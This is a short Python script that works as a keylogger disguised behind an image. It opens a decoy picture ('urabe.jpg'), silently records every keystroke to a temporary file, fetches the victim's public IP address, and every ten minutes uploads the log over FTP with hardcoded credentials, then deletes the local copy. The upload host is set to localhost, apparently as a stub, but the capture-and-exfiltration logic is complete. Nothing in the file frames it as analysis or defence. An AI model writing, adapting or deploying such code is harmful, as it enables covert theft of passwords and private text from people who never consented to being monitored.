from pynput import keyboard
#from pynput.keyboard import Listener
from PIL import Image
import time
import ftplib
import os
import requests
import tempfile
import threading

tempdir = tempfile.gettempdir()
filename = os.path.join(tempdir, 'file')

def ftpUpload():
    HOSTNAME = "localhost"
    USERNAME = "Frankom"
    PASSWORD = "123"
    IPAddr = requests.get("https://api.ipify.org/?format=json").json()['ip']
    filename2 = os.path.join('file-'+IPAddr)
    #filename = 'file'+'-'+IPAddr
    ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)
    with open(filename, 'rb') as f:
        ftp_server.storbinary(f"APPE {filename2}", f)

def on_press(key):
    with open(filename, 'a') as f:
        f.write(str(key)+' ')

Image.open('urabe.jpg').show()

with open(filename, 'a') as f:
    f.write('')

#with Listener(on_press=on_press) as listener:
#    listener.join()
listener = keyboard.Listener(on_press=on_press)
listener.start()

def every10mins():
    while True:
        time.sleep(600)
        ftpUpload()
        os.remove(filename)

thread = threading.Thread(target=every10mins, daemon=True)
thread.start()

while True:
    time.sleep(1)